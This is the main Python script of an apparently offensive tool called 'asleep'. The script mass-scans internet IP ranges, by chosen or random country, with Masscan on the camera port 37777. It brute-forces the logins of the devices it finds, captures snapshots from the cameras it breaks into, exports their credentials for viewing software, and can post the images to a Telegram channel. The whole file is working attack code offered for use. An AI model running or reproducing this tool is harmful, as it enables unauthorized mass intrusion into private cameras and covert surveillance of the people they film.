#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import argparse
import os
import platform
import random
import subprocess
import sys
import time
from pathlib import Path
from queue import Queue

from colorama import init
from countrycode import countrycode
from pyfiglet import Figlet

import config
import export
import utils
from bot import Poster
from brute import BruteThread
from geolocation import IPDenyGeolocationToIP
from snapshot import ScreenshotThread

# TODO: make bruteforce core function
# TODO: rewrite with importlib, python-netsurv, git://dhondta/sploitkit

def process_cameras():
    brute_file = config.tmp_masscan_file
    hosts = utils.masscan_parse(brute_file)
    ip_count = len(hosts)
    config.logging.info(f"Parsed {ip_count} IPs from Masscan output")

    if not hosts:
        return False
    if ip_count < config.default_brute_threads:
        config.default_brute_threads = ip_count
        config.default_snap_threads = max(1, ip_count - 20)

    ips_list_file = config.ips_file % config.start_datetime
    full_ips_list = Path(config.reports_folder) / ips_list_file
    with open(full_ips_list, 'w') as file:
        for host in hosts:
            file.write(host[0] + ":" + host[1] + "\n")
    config.logging.info(f'IPs saved to {full_ips_list}')

    config.total = len(hosts)

    try:
        brute_queue = Queue()
        screenshot_queue = Queue()

        for _ in range(config.default_brute_threads):
            brute_worker = BruteThread(brute_queue, screenshot_queue)
            brute_worker.daemon = True
            brute_worker.start()

        for _ in range(config.default_snap_threads):
            screenshot_worker = ScreenshotThread(screenshot_queue)
            screenshot_worker.daemon = True
            screenshot_worker.start()

        config.logging.info(f'Starting to brute total {len(hosts)} devices\n')
        for host in hosts:
            brute_queue.put(host)

        brute_queue.join()
        screenshot_queue.join()
        # raise exception here
        print('\n')

    except Exception as e:
        config.logging.error(e)
        config.logging.info("Brute process interrupt!")
        config.logging.debug(config.working_hosts)

    config.logging.info(f'Results: {len(hosts)} devices found, {len(config.working_hosts)} bruted')
    config.logging.info(f'Made total {config.snapshots_counts} snapshots')


def masscan(filescan, threads, resume):
    config.logging.info(f'Starting scan with masscan on ports {", ".join(config.global_ports)}')
    if resume:
        config.logging.info('Continue last scan from paused.conf')
        params = ' --resume paused.conf {config.additional_masscan_params()}'
    else:
        params = ' -p %s -iL %s -oL %s --rate=%s %s' % (
            ",".join(config.global_ports), filescan, config.tmp_masscan_file, threads, config.additional_masscan_params())
        params += ' --http-user-agent="Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"'
    if platform.system() == 'Windows':
        mmasscan_path = config.masscan_windows_path
        binary = mmasscan_path
    else:
       mmasscan_path = config.masscan_nix_path
       binary = f'sudo {mmasscan_path}'

    try:
        if platform.system() == 'Windows':
            subprocess.Popen(
                [mmasscan_path, '-V'],
                bufsize=10000,
                stdout=subprocess.PIPE)
        else:
            subprocess.Popen(
                [mmasscan_path, '-V'],
                bufsize=10000,
                stdout=subprocess.PIPE,
                close_fds=True)
    except OSError:
        config.logging.error(
            'Please install Masscan or define full path to binary in .config file.')
        sys.exit(0)

    os.system(binary + params)
    if not Path(config.tmp_masscan_file).exists():
        config.logging.error('Masscan output error, results file %s not found. Try to run Masscan as Administrator (root)' %
                      config.tmp_masscan_file)
        sys.exit(0)


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-s', dest='scan_file',
                        help='file with IP ranges to scan, e.g. 192.168.1.1-192.168.11.1')
    parser.add_argument('-p', dest='ports',
                        help='ports to scan (default: 37777), e.g. 37777,37778')                    
    parser.add_argument('-b', dest='brute_file',
                        help='file with IPs to brute, in any format')
    parser.add_argument('-l', dest='use_custom_credentials', action='store_true', default=False,
                        help=f'brute combinations from {config.logins_file} and {config.passwords_file} instead of {config.logopass_file}')                  
    parser.add_argument('-m', '--masscan', dest='brute_only', action="store_false", default=True,
                        help='run Masscan and brute the results')
    parser.add_argument('-t', dest='threads', default=str(config.default_masscan_threads),
                        help=f'number of thread for Masscan (default: %(default)s)')
    parser.add_argument('--masscan-resume', dest='masscan_resume', action="store_true", default=False,
                        help='continue paused Masscan')
    parser.add_argument('--no-snapshots', dest='snapshots_enabled', action="store_false", default=True,
                        help='don\'t make snapshots')
    parser.add_argument('--no-xml', dest='no_xml', action="store_true", default=False,
                        help='don\'t make SMART PSS .xml files')
    parser.add_argument('--dead', dest='dead_cams', action='store_true', default=False,
                        help='write not bruted cams to dead_cams.txt file')
    parser.add_argument('--country', dest='country',
                        action='store_true', default=False, help='scan by country')
    parser.add_argument('--random-country', dest='random_country', action='store_true', default=False,
                        help='scan by random country')
    parser.add_argument('-d', '--debug', dest='debug',
                        action='store_true', default=False, help='debug output')

    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit()                 
    args = parser.parse_args()

    country = ''
    city = ''
    count = 0
    
    config.snapshots_enabled = args.snapshots_enabled

    if args.ports:
        print('It`s better to run with "-d" flag while setting custom ports!')
        print('That`s why this forced c;\n')
        args.debug = True
        config.global_ports = args.ports.split(',')

    if args.masscan_resume:
        args.brute_only = False

    if args.random_country:
        args.brute_only = False
        count = 600000
        total_count = 0
        total_range = []

        while config.max_ips < count:
            country = random.choice(countrycode.data['country_name'])
            for stored_c in list(dict.fromkeys(config.random_countries)):
                if country is stored_c:
                   continue
            locator = IPDenyGeolocationToIP(country, city)
            try:
                range_list = locator.get_random_ranges(max_ips=int(count), day_ranges=True)
            except Exception as e:
                config.logging.debug(e)
                continue
            total_range += range_list
            slash = ['|', '/', ' ', '-']
            print(f'Searching for a bright-day ip-ranges {random.choice(slash)}', end='\r')
            time.sleep(2) # spell from ban
            for cidr in range_list:
                count2 = IPDenyGeolocationToIP.get_cidr_count(cidr)
                total_count += count2
            config.max_ips = total_count
        else:
             config.logging.info('Generated %s IPs from %s' % (total_count, list(dict.fromkeys(config.random_countries))))
             config.global_country = random.choice(config.random_countries)
             file = open(config.tmp_masscan_file, 'w')
             file.write("\n".join(total_range))
             file.close()
             args.scan_file = config.tmp_masscan_file

    if args.country:
        args.brute_only = False
        country = input('Enter country name (defaut random): ')
        if not country:
            country = random.choice(countrycode.data['country_name'])
            print('Selected %s' % country)
        config.global_country = country
        city = input('Enter city name (default none): ')
        count = input('Maximum IPs (default 1000000): ') or 1000000
        locator = IPDenyGeolocationToIP(country, city)
        range_list = locator.get_random_ranges(max_ips=int(count))
        total_count = 0
        for cidr in range_list:
            count3 = IPDenyGeolocationToIP.get_cidr_count(cidr)
            total_count += count3

        config.logging.info('Generated %s IPs from %s' % (total_count, config.global_country))

        file = open(config.tmp_masscan_file, 'w')
        file.write("\n".join(range_list))
        file.close()

        args.scan_file = config.tmp_masscan_file

    if not args.brute_file:
        args.brute_file = config.tmp_masscan_file
    else:
        config.custom_brute_file = True
        config.tmp_masscan_file = args.brute_file

    if not Path(args.brute_file).exists() and args.brute_only:
        config.logging.error('File with IPs %s not found. Specify it with -b option or run without brute-only option'
                             % config.tmp_masscan_file)
        sys.exit(0)

    if not args.scan_file and not args.brute_only and not args.masscan_resume:
        config.logging.error("No target file scan list")
        parser.print_help()
        sys.exit(0)

    return args


def main():
    init()
    print(Figlet(font='slant').renderText('asleep'))
    print('https://t.me/asleep_cg\n')

    args = get_args()
    if args.debug:
        config.logging.getLogger().setLevel(config.logging.DEBUG)
    else:
        config.logging.getLogger().propagate = False
    utils.setup_credentials(args.use_custom_credentials)
    utils.prepare_folders_and_files()
    if not args.brute_only:
        masscan(args.scan_file, args.threads, args.masscan_resume)
    process_cameras()
    if not args.no_xml and len(config.working_hosts) > 0:
        export.save_xml(config.working_hosts)
    export.save_csv()
    if args.dead_cams:
        hosts = utils.masscan_parse(config.tmp_masscan_file)
        export.dead_cams(hosts)

    # Configs for Telegram Bot:
    ROOM_ID = '' # Channel ID
    TOKEN = '' # Bot Token
    SNAPSHOT_DIR = Path.cwd() / config.snapshots_folder
    """ delete=True removes snapshots after posting """
    #poster = Poster(SNAPSHOT_DIR, TOKEN, ROOM_ID, delete=False) 
    #poster.start()  ### Start posting function

    if Path(config.snapshots_folder).exists():
        c_error = False
        if config.global_country:
            try:
                Path(config.snapshots_folder).rename(f'{config.global_country}_{config.start_datetime}')
            except:
                c_error = True
        elif not config.global_country or c_error:
            Path(config.snapshots_folder).rename(f'Snapshots_{config.start_datetime}')


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n')
        config.logging.info('Interrupted by user')
        sys.exit(0)
